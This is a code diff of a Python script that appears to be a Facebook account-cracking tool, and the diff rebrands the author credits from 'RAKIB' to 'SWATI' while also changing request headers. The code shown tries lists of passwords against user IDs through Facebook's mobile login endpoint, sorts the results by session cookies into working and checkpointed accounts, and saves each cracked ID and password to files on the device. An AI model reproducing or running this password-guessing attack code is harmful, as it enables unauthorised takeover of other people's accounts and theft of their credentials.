@@ -186,9 +186,9 @@ def my_tool_security():
     print(logo)
     print(47*"-")
     print(c, 45*"-",)
-    print("\t  Facebook : RAKIB KHAN ")
-    print("\t  Fb page  : RAKIBS COMMUNITY ")
-    print("\t  Github   : RAKIB48")
+    print("\t  Facebook : SWATI KHAN ")
+    print("\t  Fb page  : SWATIS COMMUNITY ")
+    print("\t  Github   : SWATI48")
     print(c, 45*"-")
     print(47*"-")
     try:
@@ -236,7 +236,7 @@ def my_tool_security():
     if f_token in my_server:
         xyz()
     else:
-        _help=uuid.uuid1().hex[:6].upper()+"=RAKIB"
+        _help=uuid.uuid1().hex[:6].upper()+"=SWATI"
         print("\n\t     [ Hello User ]\n")
         print(" This is paid tool you need subscription to use")
         print(" for buy subscription press enter an msg")
@@ -493,43 +493,43 @@ def free1(uid,pwx,tl):
             "email":uid,
             "pass":ps,
             "login":"Log In"}
-            header_freefb = {'authority': 'p.facebook.com',
-            'method': 'POST',
-            'scheme': 'https',
-            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-            'accept-language': 'en-US,en;q=0.9,ur-PK;q=0.8,ur;q=0.7,fa-IR;q=0.6,fa;q=0.5',
-            'cache-control': 'max-age=0',
-            'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
-            'sec-ch-ua-mobile': '?1',
-            'sec-ch-ua-platform': '"Android"',
-            'sec-fetch-dest': 'document',
-            'sec-fetch-mode': 'navigate',
-            'sec-fetch-site': 'none',
-            'sec-fetch-user': '?1',
-            'upgrade-insecure-requests': '1',
-            'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',}
+            header = ({
+    'authority': 'x.facebook.com',
+    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+    'accept-language': 'en-US,en;q=0.9,ur-PK;q=0.8,ur;q=0.7,fa-IR;q=0.6,fa;q=0.5',
+    'cache-control': 'max-age=0',
+    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
+    'sec-ch-ua-mobile': '?1',
+    'sec-ch-ua-platform': '"Android"',
+    'sec-fetch-dest': 'document',
+    'sec-fetch-mode': 'navigate',
+    'sec-fetch-site': 'none',
+    'sec-fetch-user': '?1',
+    'upgrade-insecure-requests': '1',
+    'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',
+})
             lo = session.post('https://p.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',data=log_data,headers=header).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 uid = coki[7:22]
-                print('\r\033[1;32m[RAKIB-OK] '+uid+' [âˆš] '+ps+ '')
+                print('\r\033[1;32m[SWATI-OK] '+uid+' [âˆš] '+ps+ '')
                 cek_apk(session,coki)
-                open('/sdcard/RAKIB-OK.txt', 'a').write(uid+' | '+ps+'\n')
+                open('/sdcard/SWATI-OK.txt', 'a').write(uid+' | '+ps+'\n')
                 ok.append(uid)
             elif 'checkpoint' in log_cookies:
                 if 'Enter login code to continue' in log_cookies:
                     coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                     uid=coki[24:39]
-                    print('\r\033[1;34m[RAKIB] '+uid+' [~] '+ps+' ')
-                    open('/sdcard/RAKIB.txt', 'a').write(uid+' | '+ps+'\n')
+                    print('\r\033[1;34m[SWATI] '+uid+' [~] '+ps+' ')
+                    open('/sdcard/SWATI.txt', 'a').write(uid+' | '+ps+'\n')
                     twf.append(uid)
                 else:
                     coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                     uid=coki[24:39]
                     Red = '\033[1;31m'
-                    print(f'\r\033[1;35m[RAKIB-CP] '+uid+' [Ã—] '+ps+ ' ')
-                    open('/sdcard/RAKIB-CP.txt', 'a').write(uid+' | '+ps+'\n')
+                    print(f'\r\033[1;35m[SWATI-CP] '+uid+' [Ã—] '+ps+ ' ')
+                    open('/sdcard/SWATI-CP.txt', 'a').write(uid+' | '+ps+'\n')
                     cp.append(uid)
                     break
             else:
@@ -593,7 +593,7 @@ def free1(uid,pwx,tl):
         for ps in pwx:
             bi = random.choice([A])
             session = requests.Session()
-            sys.stdout.write(f'\r\33[1;37m[RAKIB ðŸ”¥] [%s] \33[1;97m[OK:%s{SRABON}CP:%s]'%(loop,len(ok),len(cp))), 
+            sys.stdout.write(f'\r\33[1;37m[SWATI ðŸ”¥] [%s] \33[1;97m[OK:%s{SRABON}CP:%s]'%(loop,len(ok),len(cp))), 
             sys.stdout.flush()
             pro = random.choice(ugen)
             free_fb = session.get('https://m.facebook.com').text
@@ -607,43 +607,43 @@ def free1(uid,pwx,tl):
             "email":uid,
             "pass":ps,
             "login":"Log In"}
-            header_freefb = {'authority': 'p.facebook.com',
-            'method': 'POST',
-            'scheme': 'https',
-            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-            'accept-language': 'en-US,en;q=0.9,ur-PK;q=0.8,ur;q=0.7,fa-IR;q=0.6,fa;q=0.5',
-            'cache-control': 'max-age=0',
-            'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
-            'sec-ch-ua-mobile': '?1',
-            'sec-ch-ua-platform': '"Android"',
-            'sec-fetch-dest': 'document',
-            'sec-fetch-mode': 'navigate',
-            'sec-fetch-site': 'none',
-            'sec-fetch-user': '?1',
-            'upgrade-insecure-requests': '1',
-            'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',}
+            header = ({
+    'authority': 'x.facebook.com',
+    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+    'accept-language': 'en-US,en;q=0.9,ur-PK;q=0.8,ur;q=0.7,fa-IR;q=0.6,fa;q=0.5',
+    'cache-control': 'max-age=0',
+    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
+    'sec-ch-ua-mobile': '?1',
+    'sec-ch-ua-platform': '"Android"',
+    'sec-fetch-dest': 'document',
+    'sec-fetch-mode': 'navigate',
+    'sec-fetch-site': 'none',
+    'sec-fetch-user': '?1',
+    'upgrade-insecure-requests': '1',
+    'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',
+})
             lo = session.post('https://p.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',data=log_data,headers=header).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 uid = coki[7:22]
-                print('\r\033[1;32m[RAKIB-OK] '+uid+' [âˆš] '+ps+ '')
+                print('\r\033[1;32m[SWATI-OK] '+uid+' [âˆš] '+ps+ '')
                 cek_apk(session,coki)
-                open('/sdcard/RAKIB-OK.txt', 'a').write(uid+' | '+ps+'\n')
+                open('/sdcard/SWATI-OK.txt', 'a').write(uid+' | '+ps+'\n')
                 ok.append(uid)
             elif 'checkpoint' in log_cookies:
                 if 'Enter login code to continue' in log_cookies:
                     coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                     uid=coki[24:39]
-                    print('\r\033[1;34m[RAKIB] '+uid+' [~] '+ps+' ')
-                    open('/sdcard/RAKIB.txt', 'a').write(uid+' | '+ps+'\n')
+                    print('\r\033[1;34m[SWATI] '+uid+' [~] '+ps+' ')
+                    open('/sdcard/SWATI.txt', 'a').write(uid+' | '+ps+'\n')
                     twf.append(uid)
                 else:
                     coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                     uid=coki[24:39]
                     Red = '\033[1;31m'
-                    print(f'\r\033[1;35m[RAKIB-CP] '+uid+' [Ã—] '+ps+ ' ')
-                    open('/sdcard/RAKIB-CP.txt', 'a').write(uid+' | '+ps+'\n')
+                    print(f'\r\033[1;35m[SWATI-CP] '+uid+' [Ã—] '+ps+ ' ')
+                    open('/sdcard/SWATI-CP.txt', 'a').write(uid+' | '+ps+'\n')
                     cp.append(uid)
                     break
             else:
@@ -704,7 +704,7 @@ def free1(uid,pwx,tl):
         for ps in pwx:
             bi = random.choice([A])
             session = requests.Session()
-            sys.stdout.write(f'\r\33[1;37m[RAKIB ðŸ”¥] [%s] \33[1;97m[OK:%s{RAKIB2}CP:%s]'%(loop,len(ok),len(cp))), 
+            sys.stdout.write(f'\r\33[1;37m[SWATI ðŸ”¥] [%s] \33[1;97m[OK:%s{SWATI2}CP:%s]'%(loop,len(ok),len(cp))), 
             sys.stdout.flush()
             pro = random.choice(ugen)
             free_fb = session.get('https://free.facebook.com').text
@@ -718,43 +718,43 @@ def free1(uid,pwx,tl):
             "email":uid,
             "pass":ps,
             "login":"Log In"}
-            header_freefb = {'authority': 'p.facebook.com',
-            'method': 'POST',
-            'scheme': 'https',
-            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-            'accept-language': 'en-US,en;q=0.9,ur-PK;q=0.8,ur;q=0.7,fa-IR;q=0.6,fa;q=0.5',
-            'cache-control': 'max-age=0',
-            'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
-            'sec-ch-ua-mobile': '?1',
-            'sec-ch-ua-platform': '"Android"',
-            'sec-fetch-dest': 'document',
-            'sec-fetch-mode': 'navigate',
-            'sec-fetch-site': 'none',
-            'sec-fetch-user': '?1',
-            'upgrade-insecure-requests': '1',
-            'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',}
+            header = ({
+    'authority': 'x.facebook.com',
+    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+    'accept-language': 'en-US,en;q=0.9,ur-PK;q=0.8,ur;q=0.7,fa-IR;q=0.6,fa;q=0.5',
+    'cache-control': 'max-age=0',
+    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
+    'sec-ch-ua-mobile': '?1',
+    'sec-ch-ua-platform': '"Android"',
+    'sec-fetch-dest': 'document',
+    'sec-fetch-mode': 'navigate',
+    'sec-fetch-site': 'none',
+    'sec-fetch-user': '?1',
+    'upgrade-insecure-requests': '1',
+    'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',
+})
             lo = session.post('https://p.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',data=log_data,headers=header).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 uid = coki[7:22]
-                print('\r\033[1;32m[RAKIB-OK] '+uid+' [âˆš] '+ps+ '')
+                print('\r\033[1;32m[SWATI-OK] '+uid+' [âˆš] '+ps+ '')
                 cek_apk(session,coki)
-                open('/sdcard/RAKIB-OK.txt', 'a').write(uid+' | '+ps+'\n')
+                open('/sdcard/SWATI-OK.txt', 'a').write(uid+' | '+ps+'\n')
                 ok.append(uid)
             elif 'checkpoint' in log_cookies:
                 if 'Enter login code to continue' in log_cookies:
                     coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                     uid=coki[24:39]
-                    print('\r\033[1;34m[RAKIB] '+uid+' [~] '+ps+' ')
-                    open('/sdcard/RAKIB.txt', 'a').write(uid+' | '+ps+'\n')
+                    print('\r\033[1;34m[SWATI] '+uid+' [~] '+ps+' ')
+                    open('/sdcard/SWATI.txt', 'a').write(uid+' | '+ps+'\n')
                     twf.append(uid)
                 else:
                     coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                     uid=coki[24:39]
                     Red = '\033[1;31m'
-                    print(f'\r\033[1;35m[RAKIB-CP] '+uid+' [Ã—] '+ps+ ' ')
-                    open('/sdcard/RAKIB-CP.txt', 'a').write(uid+' | '+ps+'\n')
+                    print(f'\r\033[1;35m[SWATI-CP] '+uid+' [Ã—] '+ps+ ' ')
+                    open('/sdcard/SWATI-CP.txt', 'a').write(uid+' | '+ps+'\n')
                     cp.append(uid)
                     break
             else:
@@ -828,43 +828,43 @@ def free1(uid,pwx,tl):
             "email":uid,
             "pass":ps,
             "login":"Log In"}
-            header_freefb = {'authority': 'p.facebook.com',
-            'method': 'POST',
-            'scheme': 'https',
-            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-            'accept-language': 'en-US,en;q=0.9,ur-PK;q=0.8,ur;q=0.7,fa-IR;q=0.6,fa;q=0.5',
-            'cache-control': 'max-age=0',
-            'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
-            'sec-ch-ua-mobile': '?1',
-            'sec-ch-ua-platform': '"Android"',
-            'sec-fetch-dest': 'document',
-            'sec-fetch-mode': 'navigate',
-            'sec-fetch-site': 'none',
-            'sec-fetch-user': '?1',
-            'upgrade-insecure-requests': '1',
-            'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',}
+            header = ({
+    'authority': 'x.facebook.com',
+    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+    'accept-language': 'en-US,en;q=0.9,ur-PK;q=0.8,ur;q=0.7,fa-IR;q=0.6,fa;q=0.5',
+    'cache-control': 'max-age=0',
+    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
+    'sec-ch-ua-mobile': '?1',
+    'sec-ch-ua-platform': '"Android"',
+    'sec-fetch-dest': 'document',
+    'sec-fetch-mode': 'navigate',
+    'sec-fetch-site': 'none',
+    'sec-fetch-user': '?1',
+    'upgrade-insecure-requests': '1',
+    'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',
+})
             lo = session.post('https://p.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',data=log_data,headers=header).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 uid = coki[7:22]
-                print('\r\033[1;32m[RAKIB-OK] '+uid+' [âˆš] '+ps+ '')
+                print('\r\033[1;32m[SWATI-OK] '+uid+' [âˆš] '+ps+ '')
                 cek_apk(session,coki)
-                open('/sdcard/RAKIB-OK.txt', 'a').write(uid+' | '+ps+'\n')
+                open('/sdcard/SWATI-OK.txt', 'a').write(uid+' | '+ps+'\n')
                 ok.append(uid)
             elif 'checkpoint' in log_cookies:
                 if 'Enter login code to continue' in log_cookies:
                     coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                     uid=coki[24:39]
-                    print('\r\033[1;34m[RAKIB] '+uid+' [~] '+ps+' ')
-                    open('/sdcard/RAKIB.txt', 'a').write(uid+' | '+ps+'\n')
+                    print('\r\033[1;34m[SWATI] '+uid+' [~] '+ps+' ')
+                    open('/sdcard/SWATI.txt', 'a').write(uid+' | '+ps+'\n')
                     twf.append(uid)
                 else:
                     coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                     uid=coki[24:39]
                     Red = '\033[1;31m'
-                    print(f'\r\033[1;35m[RAKIB-CP] '+uid+' [Ã—] '+ps+ ' ')
-                    open('/sdcard/RAKIB.txt', 'a').write(uid+' | '+ps+'\n')
+                    print(f'\r\033[1;35m[SWATI-CP] '+uid+' [Ã—] '+ps+ ' ')
+                    open('/sdcard/SWATI.txt', 'a').write(uid+' | '+ps+'\n')
                     cp.append(uid)
                     break
             else:
